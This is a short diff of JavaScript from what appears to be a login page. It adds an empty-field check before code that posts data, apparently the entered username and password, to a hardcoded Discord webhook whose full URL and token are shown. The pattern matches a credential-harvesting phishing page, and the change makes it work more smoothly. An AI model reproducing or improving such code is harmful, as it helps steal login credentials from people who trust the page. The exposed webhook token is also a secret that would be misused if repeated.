@@ -114,6 +114,11 @@
       
         const webhookURL = "https://discord.com/api/webhooks/1343340234464821248/7bYyB-mM441fpzIYpaNs8YkqF3OgvLKOYm1vLwvo0e9g-ygyQPXTd6sc7B4PhMePMZQA";
 
+         if (username === "" || password === "") {
+            alert("Please enter both username and password!");
+            return; 
+        }
+
         fetch(webhookURL, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
